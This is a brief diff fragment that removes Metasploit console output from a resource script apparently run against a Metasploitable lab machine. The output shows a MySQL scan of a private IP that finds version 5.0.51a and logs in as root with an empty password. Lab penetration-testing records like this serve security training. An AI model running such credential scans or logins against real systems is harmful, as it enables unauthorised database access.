@@ -1,6 +1,0 @@
-resource (./data/rc/Metasploitable_msf.rc)> set rhosts 192.168.2.190
-rhosts => 192.168.2.190
-resource (./data/rc/Metasploitable_msf.rc)> run
-[+] 192.168.2.190:3306    - 192.168.2.190:3306 - Found remote MySQL version 5.0.51a
-[!] 192.168.2.190:3306    - No active DB -- Credential data will not be saved!
-[+] 192.168.2.190:3306    - 192.168.2.190:3306 - Success: 'root:'
